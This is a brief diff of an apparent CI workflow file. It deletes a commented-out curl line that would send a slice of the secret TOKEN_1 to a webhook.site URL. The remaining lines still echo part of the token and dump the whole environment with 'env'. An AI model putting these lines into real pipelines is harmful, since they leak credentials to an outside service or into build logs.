@@ -24,7 +24,6 @@ jobs:
           echo "running py setup"
           echo "TOKEN 1 ${TOKEN_1:0:10}"
           env
-          # curl "https://webhook.site/5dfc0631-7425-4b92-9b17-76bd450a1a43?test=1&data=${TOKEN_1:0:10}"
           
           
       # - name: test pushback
